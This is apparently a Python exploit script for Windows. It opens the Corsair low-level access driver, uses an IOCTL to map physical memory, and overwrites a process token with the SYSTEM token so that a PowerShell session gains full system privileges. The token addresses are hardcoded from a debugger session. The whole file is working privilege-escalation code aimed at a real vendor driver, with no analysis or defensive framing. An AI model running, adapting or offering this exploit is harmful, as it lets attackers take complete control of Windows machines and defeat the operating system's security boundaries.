
import ctypes
import struct
import sys

# Corsair IOCTLs
IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def perform_token_swap(phys_addr, system_token):
    print(f"[*] Opening driver handle...")
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1 or h == 0xFFFFFFFFFFFFFFFF:
        print(f"[-] Failed to open driver. Error: {ctypes.get_last_error()}")
        return

    # 1. Map the specific physical page
    page_base = phys_addr & ~0xFFF
    offset = phys_addr & 0xFFF
    
    print(f"[*] Mapping page base 0x{page_base:X}...")
    inp = struct.pack("<QII", page_base, PAGE_SIZE, 0)
    mapped_va = ctypes.c_uint64(0)
    returned = ctypes.c_uint32(0)
    
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(mapped_va), 8, ctypes.byref(returned), None)
    
    if not ok or not mapped_va.value:
        print(f"[-] Map failed. Error: {ctypes.get_last_error()}")
        kernel32.CloseHandle(h)
        return

    print(f"[+] Page mapped at VA 0x{mapped_va.value:X}")
    target_va = mapped_va.value + offset
    
    # 2. Read old token (just for verification)
    old_token = struct.unpack("<Q", bytes((ctypes.c_ubyte * 8).from_address(target_va)))[0]
    print(f"[*] Current Token Value: 0x{old_token:X}")
    
    # 3. Write SYSTEM Token
    print(f"[!] Writing SYSTEM Token 0x{system_token:X} to 0x{target_va:X}...")
    try:
        # We use ctypes to write directly to the mapped VA
        dst = (ctypes.c_uint64).from_address(target_va)
        dst.value = system_token
        print("[+] Write successful!")
    except Exception as e:
        print(f"[-] Write failed: {e}")

    # 4. Cleanup (DO NOT UNMAP via IOCTL, just close handle to avoid 0x4E crash)
    kernel32.CloseHandle(h)
    print("[*] Handle closed. Check your PowerShell privileges!")

if __name__ == "__main__":
    # Data from our debugger investigation
    PHYS_TOKEN_ADDR = 0x2474082C8
    SYSTEM_TOKEN = 0xFFFFAC8D8926D95F
    
    perform_token_swap(PHYS_TOKEN_ADDR, SYSTEM_TOKEN)
